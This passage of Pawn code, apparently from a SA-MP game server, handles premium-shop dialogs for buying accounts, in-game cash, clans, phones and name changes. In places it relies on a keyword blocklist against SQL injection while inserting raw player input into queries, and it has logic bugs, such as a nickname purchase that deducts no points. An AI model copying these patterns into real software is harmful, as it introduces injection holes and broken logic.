						mysql_format(SQL,str2,sizeof(str2), "INSERT INTO shop_logs (playerid,Message) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
						mysql_tquery(SQL,str2,"","");
					}
			}
			if(listitem == 4)
			{
					if(PlayerInfo[playerid][pPremiumAccount] > 0)
				    {
				        SendClientMessage(playerid, COLOR_ERROR, "Already registered premium.");
				        return 1;
					}
					if(PlayerInfo[playerid][pHelpedPlayers] < 1000)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Shop Helper", "You do not have enough points to buy this item.", "OK", "");
						return 1;
					}
					PlayerInfo[playerid][pHelpedPlayers] -= 1000;
					PlayerInfo[playerid][pPremiumAccount] = 1;
					new str[300],strings[200],name[30],stringss[200];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Premium`='1',`HelpedPlayers`='%d' WHERE `numewq9q5s6ad9`='%s'",PlayerInfo[playerid][pHelpedPlayers],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, COLOR_YELLOW, "You bought premium account!(-1000 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/hshop: %s bought premium account.",name);
					ABroadCast(COLOR_YELLOW,strings,1);
					mysql_real_escape_string(strings, stringss);
					mysql_format(SQL,str,sizeof(str), "INSERT INTO shop_logs (playerid,Message) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
					mysql_tquery(SQL,str,"","");
			}
	    }
	}
	if(dialogid == DIALOG_SHOP)
	{
	    if(response)
		{
				if(listitem == 0)
				{
				    if(PlayerInfo[playerid][pPremiumAccount] > 0)
				    {
				        SendClientMessage(playerid, COLOR_ERROR, "You already have a premium account.");
				        return 1;
					}
					if(PlayerInfo[playerid][pPremiumPoints] < 80)
					{
					    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					    return 1;
					}
					PlayerInfo[playerid][pPremiumPoints] -= 80;
					Update(playerid, pPremiumPointsx);
					PlayerInfo[playerid][pPremiumAccount] = 1;
					new str[300],strings[200],name[30],stringss[200];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Premium`='1',`PremiumPoints`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPremiumPoints],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, COLOR_YELLOW, "You have bought a premium account!(-80 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought a premium account.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
					mysql_real_escape_string(strings, stringss);
					mysql_format(SQL,str,sizeof(str), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
					mysql_tquery(SQL,str,"","");
				}
				if(listitem == 1)
				{
				    if(PlayerInfo[playerid][pPremiumPoints] < 20)
					{
					    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Change nickname", "You do not have enough points premium to change your nick\nYou need 20 points premium to change your nick", "Close", "");
					    return 1;
					}
		 			new str2[300],strings[200],name[30],stringss[200];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `PremiumPoints`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPremiumPoints],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str2,"","");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s changed his name.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
					mysql_real_escape_string(strings, stringss);
					mysql_format(SQL,str2,sizeof(str2), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
					mysql_tquery(SQL,str2,"","");
					ShowPlayerDialog(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Change name:", "Please enter the new name below", "Select", "Cancel");
				}
				if(listitem == 2)
				{
				    if(PlayerInfo[playerid][pFpunish] <= 0)
					{
						SendClientMessage(playerid, COLOR_ERROR, "You don't have any faction punish.");
						return 1;
					}
					if(PlayerInfo[playerid][pPremiumPoints] < 20)
					{
					    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					    return 1;
					}
					new strings[200],name[30],stringss[200];
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s cleared his 10 FP.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
					PlayerInfo[playerid][pPremiumPoints] -= 20;
					Update(playerid, pPremiumPointsx);
					PlayerInfo[playerid][pFpunish] -= 10;
					if(PlayerInfo[playerid][pFpunish] <= 0) PlayerInfo[playerid][pFpunish] = 0;
					new str[300];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `FPunish`='%d',`PremiumPoints`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFpunish],PlayerInfo[playerid][pPremiumPoints],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your 10 FP! (-20 premium points)");
					mysql_real_escape_string(strings, stringss);
					mysql_format(SQL,str,sizeof(str), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
					mysql_tquery(SQL,str,"","");
				}
				if(listitem == 3)
				{
				    if(PlayerInfo[playerid][pFpunish] <= 0)
					{
						SendClientMessage(playerid, COLOR_ERROR, "You don't have any faction punish.");
						return 1;
					}
					if(PlayerInfo[playerid][pPremiumPoints] < 40)
					{
					    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					    return 1;
					}
					new strings[200],name[30],stringss[200];
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s cleared his 20 FP.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
					PlayerInfo[playerid][pPremiumPoints] -= 40;
					Update(playerid, pPremiumPointsx);
					PlayerInfo[playerid][pFpunish] -= 20;
					if(PlayerInfo[playerid][pFpunish] <= 0) PlayerInfo[playerid][pFpunish] = 0;
					new str[300];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `FPunish`='%d',`PremiumPoints`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFpunish],PlayerInfo[playerid][pPremiumPoints],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your 20 FP! (-40 premium points)");
					mysql_real_escape_string(strings, stringss);
					mysql_format(SQL,str,sizeof(str), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
					mysql_tquery(SQL,str,"","");
				}
				if(listitem == 4)
				{
				    if(PlayerInfo[playerid][pWarns] <= 0)
                    {
						SendClientMessage(playerid, COLOR_ERROR, "You don't have any warn.");
						return 1;
					}
					if(PlayerInfo[playerid][pPremiumPoints] < 20)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					PlayerInfo[playerid][pPremiumPoints] -= 20;
					Update(playerid, pPremiumPointsx);
					PlayerInfo[playerid][pWarns] = 0;
					new str[300],strings[200],name[30],stringss[200];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Warnings`='0',`PremiumPoints`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPremiumPoints],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your warns! (-20 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s cleared his warns.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
					mysql_real_escape_string(strings, stringss);
					mysql_format(SQL,str,sizeof(str), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
					mysql_tquery(SQL,str,"","");
				}
				if(listitem == 5)
				{
					new i,stringyy[500];
					if(PlayerInfo[playerid][pPremiumPoints] >= 100)
					{
						if(PlayerInfo[playerid][pClan] == 0)
						{
						    ShowPlayerDialog(playerid, DIALOG_CHOOSECLANNAME, DIALOG_STYLE_INPUT, "Clan name", "Insert clan name in the box below:\n(You can't change it after that!)", "Ok", "");

							//	mysql_format(SQL, safeString, sizeof(safeString), "INSERT INTO clans (clanName) VALUES('New Clan')");
							//	mysql_tquery(SQL,safeString,"","");
							//	i = mysql_insert_id();
							//========
							clanss++;
							i = clanss;
							
							mysql_format(SQL, stringyy, sizeof(stringyy), "INSERT INTO `clans` (`clanID`,`clanName`) VALUES('%d','New Clan')",i);
							new Cache: resultoccc = mysql_query(SQL, stringyy);
							
        					cache_delete(resultoccc);

							ClanInfo[i][cClanExpire] = gettime() + (90*86400);

							PlayerInfo[playerid][pClan] = i; 

							new strings[200],name[30],stringss[200],str[300];
        					GetPlayerName(playerid, name, sizeof(name));
							format(strings, sizeof(strings), "/shop: %s created a new clan.",name);
							ABroadCast(COLOR_YELLOW,strings,6);
							mysql_real_escape_string(strings, stringss);
							mysql_format(SQL,str,sizeof(str), "INSERT INTO shop_logs (playerid,Message) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
							mysql_tquery(SQL,str,"","");
							mysql_format(SQL, stringyy, sizeof(stringyy), "UPDATE `clans` SET `clanExpire`='%d' WHERE `clanID`='%d'",ClanInfo[i][cClanExpire],i);
							mysql_tquery(SQL, stringyy, "", "");

						}
						else return SCM(playerid,COLOR_SERVER,"You already are in a clan! Use /quitclan first.");
					}
					else return ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					//SCM(playerid, COLOR_ERROR, "Aceasta actiune este in mentenanta");
				}
				if(listitem == 6)
				{
				    if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
					&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10])
                    {
						SendClientMessage(playerid, COLOR_ERROR, "You don't have a own vehicle.");
						return 1;
					}
					if(PlayerInfo[playerid][pPremiumPoints] < 20)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					PlayerInfo[playerid][pPremiumPoints] -= 20;
					Update(playerid, pPremiumPointsx);
					PlayerInfo[playerid][pHiddenColor] += 1;
					Update(playerid, pHiddenColorx);
					new str2[300],strings[200],name[30],stringss[200];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `PremiumPoints`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPremiumPoints],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_YELLOW, "You have bought a hidden color! (-20 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought a hidden color.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
					mysql_real_escape_string(strings, stringss);
					mysql_format(SQL,str2,sizeof(str2), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
					mysql_tquery(SQL,str2,"","");
				}
				if(listitem == 7)
				{
					if(PlayerInfo[playerid][pPremiumPoints] < 5)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					PlayerInfo[playerid][pPremiumPoints] -= 5;
					Update(playerid, pPremiumPointsx);
					PlayerInfo[playerid][pFWorks] += 20;
					new str2[300],strings[200],name[30],stringss[200];
					mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `PremiumPoints`='%d',`FWorks`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPremiumPoints],PlayerInfo[playerid][pFWorks],PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_YELLOW, "You bought 20 Fireworks, use the command /launchfw (-5 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought 20 fireworks.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
					mysql_real_escape_string(strings, stringss);
					mysql_format(SQL,str2,sizeof(str2), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
					mysql_tquery(SQL,str2,"","");
				}
				if(listitem == 8)
				{
				    if(PlayerInfo[playerid][pPhone] == 1)
                    {
						SendClientMessage(playerid, COLOR_ERROR, "You have already a iPhone.");
						return 1;
					}
					if(PlayerInfo[playerid][pPremiumPoints] < 15)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					new strings[500];
					format(strings,sizeof(strings),"iPhone Features:\n- 4-digit phone number of your choice.\n- You can deactivate call if you want to receive only SMS.\n- chat will appear in `* Player turns of His iPhone`.\n- option / reply last reply to incoming SMS.\n- option / block to temporarily block a phone number.\n\nChoose a phone number:");
					ShowPlayerDialog(playerid, DIALOG_IPHONE, DIALOG_STYLE_INPUT, "iPhone", strings, "Ok", "Cancel");
				}
				if(listitem == 9)
				{
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Clear KM & DAYS", "To remove km and days drive, type / v -> car you want -> Clear Age and KM (you need 20 points premium).", "Close", "");
						return 1;
				}
				if(listitem == 10)
				{
					if(PlayerInfo[playerid][pPremiumPoints] < 1)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					new name[30], strings[200];
					PlayerInfo[playerid][pPremiumPoints] -= 1;
					Update(playerid, pPremiumPointsx);
					GivePlayerCash(playerid, 300000);
					Update(playerid, pCashx);
					SendClientMessage(playerid, COLOR_YELLOW, "You have bought a $300,000 (-1 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought a $300,000.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
				}
				if(listitem == 11)
				{
					if(PlayerInfo[playerid][pPremiumPoints] < 10)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					new name[30], strings[200];
					PlayerInfo[playerid][pPremiumPoints] -= 10;
					Update(playerid, pPremiumPointsx);
					GivePlayerCash(playerid, 3000000);
					Update(playerid, pCashx);
					SendClientMessage(playerid, COLOR_YELLOW, "You have bought a $3,000,000 (-10 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought a $3,000,000.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
				}
				if(listitem == 12)
				{
					if(PlayerInfo[playerid][pPremiumPoints] < 50)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					new name[30], strings[200];
					PlayerInfo[playerid][pPremiumPoints] -= 50;
					Update(playerid, pPremiumPointsx);
					GivePlayerCash(playerid, 15000000);
					Update(playerid, pCashx);
					SendClientMessage(playerid, COLOR_YELLOW, "You have bought a $15,000,000 (-50 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought a $15,000,000.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
				}
				if(listitem == 13)
				{
					if(PlayerInfo[playerid][pPremiumPoints] < 100)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					new name[30], strings[200];
					PlayerInfo[playerid][pPremiumPoints] -= 100;
					Update(playerid, pPremiumPointsx);
					GivePlayerCash(playerid, 30000000);
					Update(playerid, pCashx);
					SendClientMessage(playerid, COLOR_YELLOW, "You have bought a $30,000,000 (-100 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought a $30,000,000.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
				}
				if(listitem == 14)
				{
				    if(PlayerInfo[playerid][pPremiumPoints] < 20)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					new name[30], strings[200];
					new str2[300];
					PlayerInfo[playerid][pPremiumPoints] -= 20;
					Update(playerid, pPremiumPointsx);
					PlayerInfo[playerid][pMP3] = 1;
					mysql_format(SQL, str2, sizeof(str2), "UPDATE `users` SET `PlayerMP3`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pMP3], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str2,"","");
					SendClientMessage(playerid, COLOR_YELLOW, "You have bought a MP3 (-20 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought a MP3.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
				}
				/*if(listitem == 16)
				{
				    if(PlayerInfo[playerid][pPremiumPoints] <= 49)
                    {
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					new name[30], strings[200];
					new i,stringyy[500];
					PlayerInfo[playerid][pPremiumPoints] -= 50;
					Update(playerid, pPremiumPointsx);
                    PlayerInfo[playerid][pClan] = i;
                    ClanInfo[i][cClanSlots] += 15;
					mysql_format(SQL, stringyy, sizeof(stringyy), "UPDATE `clans` SET `clanSlots`='%d' WHERE `clanID`='%d'",ClanInfo[i][cClanSlots],i);
					mysql_tquery(SQL, stringyy, "", "");
					SendClientMessage(playerid, COLOR_YELLOW, "You have bought +15 clan slots (-50 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought + 15 clan slots.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
				}*/
				if(listitem == 15)
				{
					if(PlayerInfo[playerid][pColors] > 0) return SCM(playerid, COLOR_ERROR, "Have you already bought your colors nickname (/ncolors).");
					if(PlayerInfo[playerid][pPremiumPoints] <= 20)
					{
						ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
						return 1;
					}
					PlayerInfo[playerid][pPremiumPoints] -= 20;
					Update(playerid, pPremiumPointsx);
					PlayerInfo[playerid][pColors] = 1;
					Update(playerid, pColorsx);
					new strings[128],name[64];
					SendClientMessage(playerid, COLOR_YELLOW, "You bought your nickname colors (/ncolors) (-20 premium points)");
					GetPlayerName(playerid, name, sizeof(name));
					format(strings, sizeof(strings), "/shop: %s bought nickname colors.",name);
					ABroadCast(COLOR_YELLOW,strings,6);
				}
			}
		}
	if(dialogid == DIALOG_CHOOSECLANNAME)
	{
	    if(response)
	    {
	        for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
			if(strlen(inputtext) >= 3 && strlen(inputtext) <= 20)
			{
			    for(new i; i < sizeof(antisqlinjection); i++)
				{
					if(strfind(inputtext, antisqlinjection[i], true) != -1)
	 				{
	  					SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
	   					return 1;
	        		}
				}
    			new clanname[25],strings[1000];
				mysql_real_escape_string(inputtext, clanname);
			    format(string, sizeof(string), "SELECT * FROM `clans` WHERE `clanTag` = '%s'", clanname);
				new Cache: verificareclan = mysql_query(SQL, string);
				if(cache_get_row_count() < 1)
				{
					strcpy(ClanInfo[PlayerInfo[playerid][pClan]][cClanName], clanname, sizeof(clanname));
					mysql_format(SQL, string, sizeof(string), "UPDATE clans SET `clanName`='%s' WHERE `clanID`='%d'", clanname, PlayerInfo[playerid][pClan]);
					mysql_tquery(SQL,string,"","");
					format(strings, sizeof(strings), "Clan name: %s, wait 5 seconds.", clanname);
					SendClientMessage(playerid, COLOR_GENANNOUNCE, strings);
					wait5sec[playerid] = 5;
				}
				else
				{
				    SCM(playerid, COLOR_ERROR, "The clan name is already registered");
				    ShowPlayerDialog(playerid, DIALOG_CHOOSECLANNAME, DIALOG_STYLE_INPUT, "Clan name", "Insert clan name in the box below:\nMinimum 3 characters and maximum 20 characters.\n(You can't change it after that!)", "Ok", "");
				}
				cache_delete(verificareclan);
			}
			else
			{
			    SCM(playerid, COLOR_ERROR, "Clan name must contain at least 2 characters and maximum 20.");
				ShowPlayerDialog(playerid, DIALOG_CHOOSECLANNAME, DIALOG_STYLE_INPUT, "Clan name", "Insert clan name in the box below:\nMinimum 3 characters and maximum 20 characters.\n(You can't change it after that!)", "Ok", "");
				return 1;
			}
		}
		else 
		{
			PlayerInfo[playerid][pClan] = 0; 
		}
	}
	if(dialogid == DIALOG_CHOOSECLANTAG)
	{
	    if(response)
	    {
	        for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
			if(strlen(inputtext) >= 2 && strlen(inputtext) <= 15)
			{
			    for(new i; i < sizeof(antisqlinjection); i++)
				{
					if(strfind(inputtext, antisqlinjection[i], true) != -1)
	 				{
	  					SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
	   					return 1;
	        		}
				}
				new clanname[25],strings[1000];
				mysql_real_escape_string(inputtext, clanname);
			    format(string, sizeof(string), "SELECT * FROM `clans` WHERE `clanTag` = '%s'", clanname);
				new Cache: verificareclan = mysql_query(SQL, string);
				if(cache_get_row_count() < 1)
				{
					strcpy(ClanInfo[PlayerInfo[playerid][pClan]][cClanTag], clanname, sizeof(clanname));
					mysql_format(SQL, strings, sizeof(strings), "UPDATE clans SET `clanTag`='%s' WHERE `clanID`='%d'", clanname, PlayerInfo[playerid][pClan]);
					mysql_tquery(SQL,strings,"","");
					format(strings, sizeof(strings), "Clan tag: %s.", clanname);
					SendClientMessage(playerid, COLOR_GENANNOUNCE, strings);
					SCM(playerid, COLOR_SERVER, "Perhaps clan tag to be [NONE], wait 5 minutes and it Will automatically reset to the initial tag.");
					LoadClanInfo();
					PlayerInfo[playerid][pPremiumPoints] -= 100;
					Update(playerid,pPremiumPointsx);
					format(strings, sizeof(strings), "You have bought a clan! (-100 premium points)");
					SendClientMessage(playerid, COLOR_YELLOW, strings);
					PlayerInfo[playerid][pCRank] = 7;
							
					new y,m,d,h,mi,s;
					getdate(y,m,d);
					gettime(h,mi,s);
					mysql_format(SQL, strings, sizeof(strings), "UPDATE users SET `CRank`='7',`Clan`='%d',`PremiumPoints`='%d',`ClanJoin`='%02d-%02d-%d %02d:%02d:%02d' WHERE `name`='%s'", PlayerInfo[playerid][pClan], PlayerInfo[playerid][pPremiumPoints],d,m,y,h,mi,s,PlayerInfo[playerid][pNormalName]);
        			mysql_tquery(SQL, strings,"","");
				}
				else
				{
				    SCM(playerid, COLOR_ERROR, "The clan tag is already registered");
				    ShowPlayerDialog(playerid, DIALOG_CHOOSECLANTAG, DIALOG_STYLE_INPUT, "Clan tag", "Insert clan tag in the box below:\nMinimum 2 characters and maximum 15 characters.\n(You can't change it after that!)", "Ok", "");
				}
				cache_delete(verificareclan);
			}
			else
			{
			    SCM(playerid, COLOR_ERROR, "Clan tag must contain at least 2 characters and maximum 15.");
				ShowPlayerDialog(playerid, DIALOG_CHOOSECLANTAG, DIALOG_STYLE_INPUT, "Clan tag", "Insert clan tag in the box below:\nMinimum 2 characters and maximum 15 characters.\n(You can't change it after that!)", "Ok", "");
				return 1;
			}
		}
		else 
		{
			PlayerInfo[playerid][pClan] = 0; 
		}
	}
	if(dialogid == DIALOG_IPHONE)
	{
	    if(response)
	    {
	        for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
	        if(IsNumeric(inputtext))
			{
			    if(strlen(inputtext) == 4)
				{
				    for(new i; i < sizeof(antisqlinjection); i++)
					{
						if(strfind(inputtext, antisqlinjection[i], true) != -1)
		 				{
		  					SCM(playerid, COLOR_ERROR, "Characters are not allowed Emen.");
		   					return 1;
		        		}
					}
				    new numb = strval(inputtext);
					if((inputtext[0] != '0'))
					{
						new query[256];
						format(query, 256, "SELECT * FROM `users` WHERE `PhoneNr` = '%d' ORDER BY `id` ASC", numb);
						new Cache: res = mysql_query(SQL, query);
						if(cache_get_row_count() != 0)
						{
							SendClientMessage(playerid, COLOR_SERVER, "That phone number is used by another player. choose another.");
							return 1;
						}
						else
						{
							PlayerInfo[playerid][pPremiumPoints] -= 15;
							PlayerInfo[playerid][pPhone] = 1;
							PlayerInfo[playerid][pPnumber] = numb;
							new str2[300],name[30],stringss[200];
							mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `PremiumPoints`='%d',`Phone`='1' WHERE `name`='%s'",PlayerInfo[playerid][pPremiumPoints],PlayerInfo[playerid][pNormalName]);
							mysql_tquery(SQL,str2,"","");
							format(string, sizeof(string), "You bought an iPhone to 15 points premium. Your phone number is %d.", numb);
							SendClientMessage(playerid, COLOR_GREEN, string);
							SendClientMessage(playerid, COLOR_GREEN, "To disable only receive calls and SMS, use /turn off calls.");
							SendClientMessage(playerid, COLOR_GREEN, "To answer the last SMS received uses /reply [text].");
							mysql_format(SQL,str2,sizeof(str2),"UPDATE users SET `PhoneNr`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPnumber],PlayerInfo[playerid][pNormalName]);
							mysql_tquery(SQL,str2,"","");
							GetPlayerName(playerid, name, sizeof(name));
							format(str2, sizeof(str2), "/shop: %s bought a iPhone.",name);
							ABroadCast(COLOR_YELLOW,str2,6);
							mysql_real_escape_string(str2, stringss);
							mysql_format(SQL,str2,sizeof(str2), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
							mysql_tquery(SQL,str2,"","");
						}
						cache_delete(res);
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "Phone number invalid. You can choose a phone number from 1000 to 9999.");
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "Phone number invalid. You can choose a phone number from 1000 to 9999.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "Phone number invalid. You can choose a phone number from 1000 to 9999.");
		}
	}
	if(dialogid == DIALOG_CHANGENAME)
	{
	    if(response)
		{
		    for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
		    if(!isnull(inputtext))
			{
				    for(new i; i < sizeof(antisqlinjection); i++)
					{
						if(strfind(inputtext, antisqlinjection[i], true) != -1)
		 				{
		  					SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
		   					return 1;
		        		}
					}
					new newname = MySQLCheckAccount(inputtext);
					if(newname != 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This name exist.");
					if(PlayerInfo[playerid][pPhousekey] != 999)
					{
						new houseid = PlayerInfo[playerid][pPhousekey];
						strmid(HouseInfo[houseid][hOwner], inputtext, 0, strlen(inputtext), 255);
						mysql_format(SQL,string,sizeof(string),"UPDATE `houses` SET `Owner`='%s' WHERE `ID`='%d'",inputtext,houseid);
						mysql_tquery(SQL,string,"","");
						OnPropTextdrawUpdate(1,PlayerInfo[playerid][pPhousekey]);
			   		}
					if(PlayerInfo[playerid][pPbiskey] != 255)
					{
						new bizid2 = PlayerInfo[playerid][pPbiskey];
						strmid(BizzInfo[bizid2][bOwner], inputtext, 0, strlen(inputtext), 255);
						mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Owner`='%s' WHERE `ID`='%d'",inputtext,bizid2);
						mysql_tquery(SQL,string,"","");
						OnPropTextdrawUpdate(2,PlayerInfo[playerid][pPbiskey]);
			   		}
			   		if(PlayerInfo[playerid][pPcarkey] != 0)
					{
						new carid = PlayerInfo[playerid][pPcarkey];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
			   		if(PlayerInfo[playerid][pmotokey] != 0)
					{
						new carid = PlayerInfo[playerid][pmotokey];
						strmid(CarInfo[carid][cOwner], inputtext, 0, strlen(inputtext), 255);
						vUpdate(carid,cOwnerx);
					}
					if(PlayerInfo[playerid][pprcarkey2] != 0)
